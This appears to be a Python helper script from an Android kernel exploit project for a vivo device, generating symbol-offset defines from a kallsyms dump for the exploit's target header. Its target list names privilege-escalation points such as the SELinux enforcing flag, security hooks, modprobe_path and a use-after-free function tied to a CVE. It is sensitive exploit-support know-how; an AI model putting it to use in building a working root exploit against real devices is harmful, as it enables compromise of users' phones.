#!/usr/bin/env python3
"""
gen_target_offsets.py — Generate target.h symbol-offset defines from a verified
kallsyms dump.

Reads a kallsyms dump (default: ../kallsyms.txt, the committed 109,687-symbol
table) and emits `#define <MACRO> 0x<off>ULL` lines for every symbol the
exploit's target.h needs. Offsets are relative to _text (kallsyms offsets).

Read-only on the input; writes only to the -o path (default: stdout). Refuses to
overwrite the input dump. Missing input -> clear error + exit 2.

Usage:
  python3 gen_target_offsets.py                      # print to stdout
  python3 gen_target_offsets.py -o ../target_offsets.txt
  python3 gen_target_offsets.py --kallsyms ../kallsyms.txt -o out.txt

License: GPLv3
"""
import sys, os, argparse

HERE = os.path.dirname(os.path.abspath(__file__))

# (macro_name, kallsyms_symbol, delta, note)
WANT = [
    ("INIT_TASK_OFF",              "__start_init_task",      0,    "init_task section start (init_task symbol filtered by vivo)"),
    ("INIT_UTS_NS_OFF",            "init_uts_ns",            0,    "init_uts_ns"),
    ("EMPTY_ZERO_PAGE_OFF",        "empty_zero_page",        0,    "empty_zero_page"),
    ("ROOT_TASK_GROUP_OFF",        "root_task_group",        0,    "root_task_group"),
    ("SELINUX_ENFORCING_OFF",      "selinux_state",          0,    "selinux_state; .enforcing at +0 (4.19 DEVELOP=y)"),
    ("SECURITY_HOOK_HEADS_OFF",    "security_hook_heads",    0,    "security_hook_heads"),
    ("KMALLOC_CACHES_OFF",         "kmalloc_caches",         0,    "kmalloc_caches"),
    ("ANON_PIPE_BUF_OPS_OFF",      "anon_pipe_buf_ops",      0,    "anon_pipe_buf_ops"),
    ("ASHMEM_MISC_OFF",            "ashmem_misc",            0,    "ashmem_misc (miscdevice)"),
    ("ASHMEM_MISC_FOPS_OFF",       "ashmem_misc",            0x10, "ashmem_misc.fops (+0x10 in struct miscdevice)"),
    ("ASHMEM_FOPS_OFF",            "ashmem_fops",            0,    "ashmem_fops"),
    ("ASHMEM_IOCTL_OFF",           "ashmem_ioctl",           0,    "ashmem_ioctl"),
    ("ASHMEM_COMPAT_IOCTL_OFF",    "compat_ashmem_ioctl",    0,    "compat_ashmem_ioctl"),
    ("ASHMEM_MMAP_OFF",            "ashmem_mmap",            0,    "ashmem_mmap"),
    ("ASHMEM_OPEN_OFF",            "ashmem_open",            0,    "ashmem_open"),
    ("ASHMEM_RELEASE_OFF",         "ashmem_release",         0,    "ashmem_release"),
    ("ASHMEM_SHOW_FDINFO_OFF",     "ashmem_show_fdinfo",     0,    "ashmem_show_fdinfo"),
    ("CONFIGFS_READ_ITER_OFF",     "configfs_read_file",     0,    "configfs_read_file (4.19 .read)"),
    ("CONFIGFS_BIN_WRITE_ITER_OFF","configfs_write_bin_file",0,    "configfs_write_bin_file (4.19)"),
    ("COPY_SPLICE_READ_OFF",       "generic_file_splice_read",0,   "generic_file_splice_read"),
    ("NOOP_LLSEEK_OFF",            "noop_llseek",            0,    "noop_llseek"),
    ("REMOVE_WAITER_OFF",          "remove_waiter",          0,    "remove_waiter (CVE-2026-43499 UAF func)"),
    ("KALLSYMS_LOOKUP_NAME_OFF",   "kallsyms_lookup_name",   0,    "kallsyms_lookup_name"),
    ("MODPROBE_PATH_OFF",          "modprobe_path",          0,    "modprobe_path"),
    ("LOGGERS_OFF",                "loggers",                0,    "loggers (nf_log)"),
    ("NFULNL_LOGGER_OFF",          "nfulnl_logger",          0,    "nfulnl_logger"),
    ("SYSCTL_BOOTID_OFF",          "sysctl_bootid",          0,    "sysctl_bootid"),
    ("PANIC_OFF",                  "panic",                  0,    "panic"),
    ("PRINTK_OFF",                 "printk",                 0,    "printk"),
    ("INIT_NSPROXY_OFF",           "init_nsproxy",           0,    "init_nsproxy"),
    ("INIT_FS_OFF",                "init_fs",                0,    "init_fs"),
    ("INIT_FILES_OFF",             "init_files",             0,    "init_files"),
]

# Symbols a generic kernel exports but vivo FILTERED from kallsyms (documented).
FILTERED = ['commit_creds', 'prepare_kernel_cred', 'init_cred', 'kernel_init',
            'init_task', '_end', '__init_begin', '__bss_start', '_edata', '_sdata']


def main():
    ap = argparse.ArgumentParser(description="Generate target.h offsets from a kallsyms dump")
    ap.add_argument("--kallsyms", default=os.path.join(HERE, "..", "kallsyms.txt"),
                    help="kallsyms dump (default: ../kallsyms.txt)")
    ap.add_argument("-o", "--output", help="write defines here (default: stdout)")
    args = ap.parse_args()

    if not os.path.isfile(args.kallsyms):
        print(f"ERROR: kallsyms dump not found: {args.kallsyms}", file=sys.stderr)
        print("       generate it: python3 parse_kallsyms.py ../boot.img --from-boot -o ../kallsyms.txt",
              file=sys.stderr)
        return 2
    if args.output and os.path.abspath(args.output) == os.path.abspath(args.kallsyms):
        print("ERROR: refusing to overwrite the input kallsyms dump", file=sys.stderr)
        return 2

    syms = {}
    for line in open(args.kallsyms, "rb"):
        line = line.decode("latin-1").rstrip("\r\n")
        if not line or " " not in line:
            continue
        off_s, raw = line.split(" ", 1)
        name = raw[1:]                      # strip leading type char
        syms.setdefault(name, int(off_s, 16))

    lines = [
        "/* target.h symbol offsets (relative to _text), generated by gen_target_offsets.py */",
        "/* Source: verified kallsyms dump (109,687 symbols, markers 429/429). */",
        "",
    ]
    missing = []
    for macro, sym, delta, note in WANT:
        base = syms.get(sym)
        if base is None:
            missing.append(sym)
            lines.append(f"/* {macro}: symbol '{sym}' NOT FOUND */")
            continue
        val = base + delta
        d = f" +{delta:#x}" if delta else ""
        lines.append(f"#define {macro} 0x{val:08x}ULL   /* {sym}{d} - {note} */")

    lines.append("")
    lines.append("/* vivo-FILTERED symbols (absent from this kallsyms; documented in README §6.5): */")
    for s in FILTERED:
        lines.append(f"/*   {s}: {'PRESENT' if s in syms else 'FILTERED (absent)'} */")

    out = "\n".join(lines) + "\n"
    if args.output:
        with open(args.output, "w") as f:
            f.write(out)
        print(f"[+] wrote {args.output}")
    else:
        sys.stdout.write(out)

    if missing:
        print(f"[!] WARNING: {len(missing)} symbols not found: {missing}", file=sys.stderr)
    return 0


if __name__ == "__main__":
    sys.exit(main())
